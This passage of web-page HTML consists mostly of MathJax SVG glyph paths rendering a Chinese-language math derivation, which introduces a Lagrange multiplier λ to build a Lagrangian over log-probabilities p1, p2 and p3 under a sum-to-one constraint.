-175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(536,-150) scale(0.707)\"><path data-c=\"32\" d=\"M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z\"/></g></g><g data-mml-node=\"mo\" transform=\"translate(3323.8,0)\"><path data-c=\"2B\" d=\"M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z\"/></g><g data-mml-node=\"msub\" transform=\"translate(4324,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D45D\" d=\"M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(536,-150) scale(0.707)\"><path data-c=\"33\" d=\"M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z\"/></g></g><g data-mml-node=\"mo\" transform=\"translate(5541.3,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(6597.1,0)\"><path data-c=\"31\" d=\"M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z\"/></g></g></g></svg></mjx-container></span>，我们引入乘子 <span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: -0.027ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"1.319ex\" height=\"1.597ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -694 583 706\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"mi\"><path data-c=\"1D706\" d=\"M166 673Q166 685 183 694H202Q292 691 316 644Q322 629 373 486T474 207T524 67Q531 47 537 34T546 15T551 6T555 2T556 -2T550 -11H482Q457 3 450 18T399 152L354 277L340 262Q327 246 293 207T236 141Q211 112 174 69Q123 9 111 -1T83 -12Q47 -12 47 20Q47 37 61 52T199 187Q229 216 266 252T321 306L338 322Q338 323 288 462T234 612Q214 657 183 657Q166 657 166 673Z\"/></g></g></g></svg></mjx-container></span>，构造：</p>\n<p><span class=\"math display\"><mjx-container class=\"MathJax\" jax=\"SVG\" display=\"true\"><svg style=\"vertical-align: -0.566ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"64.942ex\" height=\"2.262ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -750 28704.2 1000\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"TeXAtom\" data-mjx-texclass=\"ORD\"><g data-mml-node=\"mi\"><path data-c=\"4C\" d=\"M62 -22T47 -22T32 -11Q32 -1 56 24T83 55Q113 96 138 172T180 320T234 473T323 609Q364 649 419 677T531 705Q559 705 578 696T604 671T615 645T618 623V611Q618 582 615 571T598 548Q581 531 558 520T518 509Q503 509 503 520Q503 523 505 536T507 560Q507 590 494 610T452 630Q423 630 410 617Q367 578 333 492T271 301T233 170Q211 123 204 112L198 103L224 102Q281 102 369 79T509 52H523Q535 64 544 87T579 128Q616 152 641 152Q656 152 656 142Q656 101 588 40T433 -22Q381 -22 289 1T156 28L141 29L131 20Q111 0 87 -11Z\"/></g></g><g data-mml-node=\"mo\" transform=\"translate(690,0)\"><path data-c=\"28\" d=\"M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z\"/></g><g data-mml-node=\"msub\" transform=\"translate(1079,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D45D\" d=\"M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(536,-150) scale(0.707)\"><path data-c=\"31\" d=\"M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z\"/></g></g><g data-mml-node=\"mo\" transform=\"translate(2018.6,0)\"><path data-c=\"2C\" d=\"M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z\"/></g><g data-mml-node=\"msub\" transform=\"translate(2463.2,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D45D\" d=\"M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(536,-150) scale(0.707)\"><path data-c=\"32\" d=\"M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z\"/></g></g><g data-mml-node=\"mo\" transform=\"translate(3402.8,0)\"><path data-c=\"2C\" d=\"M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z\"/></g><g data-mml-node=\"msub\" transform=\"translate(3847.4,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D45D\" d=\"M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(536,-150) scale(0.707)\"><path data-c=\"33\" d=\"M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z\"/></g></g><g data-mml-node=\"mo\" transform=\"translate(4787,0)\"><path data-c=\"2C\" d=\"M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(5231.7,0)\"><path data-c=\"1D706\" d=\"M166 673Q166 685 183 694H202Q292 691 316 644Q322 629 373 486T474 207T524 67Q531 47 537 34T546 15T551 6T555 2T556 -2T550 -11H482Q457 3 450 18T399 152L354 277L340 262Q327 246 293 207T236 141Q211 112 174 69Q123 9 111 -1T83 -12Q47 -12 47 20Q47 37 61 52T199 187Q229 216 266 252T321 306L338 322Q338 323 288 462T234 612Q214 657 183 657Q166 657 166 673Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(5814.7,0)\"><path data-c=\"29\" d=\"M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(6481.4,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(7537.2,0)\"><path data-c=\"35\" d=\"M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(8203.9,0)\"><path data-c=\"6C\" d=\"M42 46H56Q95 46 103 60V68Q103 77 103 91T103 124T104 167T104 217T104 272T104 329Q104 366 104 407T104 482T104 542T103 586T103 603Q100 622 89 628T44 637H26V660Q26 683 28 683L38 684Q48 685 67 686T104 688Q121 689 141 690T171 693T182 694H185V379Q185 62 186 60Q190 52 198 49Q219 46 247 46H263V0H255L232 1Q209 2 183 2T145 3T107 3T57 1L34 0H26V46H42Z\"/><path data-c=\"6F\" d=\"M28 214Q28 309 93 378T250 448Q340 448 405 380T471 215Q471 120 407 55T250 -10Q153 -10 91 57T28 214ZM250 30Q372 30 372 193V225V250Q372 272 371 288T364 326T348 362T317 390T268 410Q263 411 252 411Q222 411 195 399Q152 377 139 338T126 246V226Q126 130 145 91Q177 30 250 30Z\" transform=\"translate(278,0)\"/><path data-c=\"67\" d=\"M329 409Q373 453 429 453Q459 453 472 434T485 396Q485 382 476 371T449 360Q416 360 412 390Q410 404 415 411Q415 412 416 414V415Q388 412 363 393Q355 388 355 386Q355 385 359 381T368 369T379 351T388 325T392 292Q392 230 343 187T222 143Q172 143 123 171Q112 153 112 133Q112 98 138 81Q147 75 155 75T227 73Q311 72 335 67Q396 58 431 26Q470 -13 470 -72Q470 -139 392 -175Q332 -206 250 -206Q167 -206 107 -175Q29 -140 29 -75Q29 -39 50 -15T92 18L103 24Q67 55 67 108Q67 155 96 193Q52 237 52 292Q52 355 102 398T223 442Q274 442 318 416L329 409ZM299 343Q294 371 273 387T221 404Q192 404 171 388T145 343Q142 326 142 292Q142 248 149 227T179 192Q196 182 222 182Q244 182 260 189T283 207T294 227T299 242Q302 258 302 292T299 343ZM403 -75Q403 -50 389 -34T348 -11T299 -2T245 0H218Q151 0 138 -6Q118 -15 107 -34T95 -74Q95 -84 101 -97T122 -127T170 -155T250 -167Q319 -167 361 -139T403 -75Z\" transform=\"translate(778,0)\"/></g><g data-mml-node=\"mo\" transform=\"translate(9481.9,0)\"><path data-c=\"2061\" d=\"\"/></g><g data-mml-node=\"msub\" transform=\"translate(9648.5,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D45D\" d=\"M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(536,-150) scale(0.707)\"><path data-c=\"31\" d=\"M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z\"/></g></g><g data-mml-node=\"mo\" transform=\"translate(10810.3,0)\"><path data-c=\"2B\" d=\"M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(11810.5,0)\"><path data-c=\"33\" d=\"M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(12477.2,0)\"><path data-c=\"6C\" d=\"M42 46H56Q95 46 103 60V68Q103 77 103 91T103 124T104 167T104 217T104 272T104 329Q104 366 104 407T104 482T104 542T103 586T103 603Q100 622 89 628T44 637H26V660Q26 683 28 683L38 684Q48 685 67 686T104 688Q121 689 141 690T171 693T182 694H185V379Q185 62 186 60Q190 52 198 49Q219 46 247 46H263V0H255L232 1Q209 2 183 2T145 3T107 3T57 1L34 0H26V46H42Z\"/><path data-c=\"6F\" d=\"M28 214Q28 309 93 378T250 448Q340 448 405 380T471 215Q471 120 407 55T250 -10Q153 -10 91 57T28 214ZM250 30Q372 30 372 193V225V250Q372 272 371 288T364 326T348 362T317 390T268 410Q263 411 252 411Q222 411 195 399Q152 377 139 338T126 246V226Q126 130 145 91Q177 30 250 30Z\" transform=\"translate(278,0)\"/><path data-c=\"67\" d=\"M329 409Q373 453 429 453Q459 453 472 434T485 396Q485 382 476 371T449 360Q416 360 412 390Q410 404 415 411Q415 412 416 414V415Q388 412 363 393Q355 388 355 386Q355 385 359 381T368 369T379 351T388 325T392 292Q392 230 343 187T222 143Q172 143 123 171Q112 153 112 133Q112 98 138 81Q147 75 155 75T227 73Q311 72 335 67Q396 58 431 26Q470 -13 470 -72Q470 -139 392 -175Q332 -206 250 -206Q167 -206 107 -175Q29 -140 29 -75Q29 -39 50 -15T92 18L103 24Q67 55 67 108Q67 155 96 193Q52 237 52 292Q52 355 102 398T223 442Q274 442 318 416L329 409ZM299 343Q294 371 273 387T221 404Q192 404 171 388T145 343Q142 326 142 292Q142 248 149 227T179 192Q196 182 222 182Q244 182 260 189T283 207T294 227T299 242Q302 258 302 292T299 343ZM403 -75Q403 -50 389 -34T348 -11T299 -2T245 0H218Q151 0 138 -6Q118 -15 107 -34T95 -74Q95 -84 101 -97T122 -127T170 -155T250 -167Q319 -167 361 -139T403 -75Z\" transform=\"translate(778,0)\"/></g><g data-mml-node=\"mo\" transform=\"translate(13755.2,0)\"><path data-c=\"2061\" d=\"\"/></g><g data-mml-node=\"msub\" transform=\"translate(13921.9,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D45D\" d=\"M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(536,-150) scale(0.707)\"><path data-c=\"32\" d=\"M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z\"/></g></g><g data-mml-node=\"mo\" transform=\"translate(15083.7,0)\"><path data-c=\"2B\" d=\"M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(16083.9,0)\"><path data-c=\"32\" d=\"M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(16750.5,0)\"><path data-c=\"6C\" d=\"M42 46H56Q95 46 103 60V68Q103 77 103 91T103 124T104 167T104 217T104 272T104 329Q104 366 104 407T104 482T104 542T103 586T103 603Q100 622 89 628T44 637H26V660Q26 683 28 683L38 684Q48 685 67 686T104 688Q121 689 141 690T171 693T182 694H185V379Q185 62 186 60Q190 52 198 49Q219 46 247 46H263V0H255L232 1Q209 2 183 2T145 3T107 3T57 1L34 0H26V46H42Z\"/><path data-c=\"6F\" d=\"M28 214Q28 309 93 378T250 448Q340 448 405 380T471 215Q471 120 407 55T250 -10Q153 -10 91 57T28 214ZM250 30Q372 30 372 193V225V250Q372 272 371 288T364 326T348 362T317 390T268 410Q263 411 252 411Q222 411 195 399Q152 377 139 338T126 246V226Q126 130 145 91Q177 30 250 30Z\" transform=\"translate(278,0)\"/><path data-c=\"67\" d=\"M329 409Q373 453 429 453Q459 453 472 434T485 396Q485 382 476 371T449 360Q416 360 412 390Q410 404 415 411Q415 412 416 414V415Q388 412 363 393Q355 388 355 386Q355 385 359 381T368 369T379 351T388 325T392 292Q392 230 343 187T222 143Q172 143 123 171Q112 153 112 133Q112 98 138 81Q147 75 155 75T227 73Q311 72 335 67Q396 58 431 26Q470 -13 470 -72Q470 -139 392 -175Q332 -206 250 -206Q167 -206 107 -175Q29 -140 29 -75Q29 -39 50 -15T92 18L103 24Q67 55 67 108Q67 155 96 193Q52 237 52 292Q52 355 102 398T223 442Q274 442 318 416L329 409ZM299 343Q294 371 273 387T221 404Q192 404 171 388T145 343Q142 326 142 292Q142 248 149 227T179 192Q196 182 222 182Q244 182 260 189T283 207T294 227T299 242Q302 258 302 292T299 343ZM403 -75Q403 -50 389 -34T348 -11T299 -2T245 0H218Q151 0 138 -6Q118 -15 107 -34T95 -74Q95 -84 101 -97T122 -127T170 -155T250 -167Q319 -167 361 -139T403 -75Z\" transform=\"translate(778,0)\"/></g><g data-mml-node=\"mo\" transform=\"translate(18028.5,0)\"><path data-c=\"2061\" d=\"\"/></g><g data-mml-node=\"msub\" transform=\"translate(18195.2,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D45D\" d=\"M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(536,-150) scale(0.707)\"><path data-c=\"33\" d=\"M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z\"/></g></g><g data-mml-node=\"mo\" transform=\"translate(19357,0)\"><path data-c=\"2B\" d=\"M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(20357.2,0)\"><path data-c=\"1D706\" d=\"M166 673Q166 685 183 694H202Q292 691 316 644Q322 629 373 486T474 207T524 67Q531 47 537 34T546 15T551 6T555 2T556 -2T550 -11H482Q457 3 450 18T399 152L354 277L340 262Q327 246 293 207T236 141Q211 112 174 69Q123 9 111 -1T83 -12Q47 -12 47 20Q47 37 61 52T199 187Q229 216 266 252T321 306L338 322Q338 323 288 462T234 612Q214 657 183 657Q166 657 166 673Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(20940.2,0)\"><path data-c=\"28\" d=\"M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(21329.2,0)\"><path data-c=\"31\" d=\"M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(22051.4,0)\"><path data-c=\"2212\" d=\"M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z\"/></g><g data-mml-node=\"msub\" transform=\"translate(23051.7,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D45D\" d=\"M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 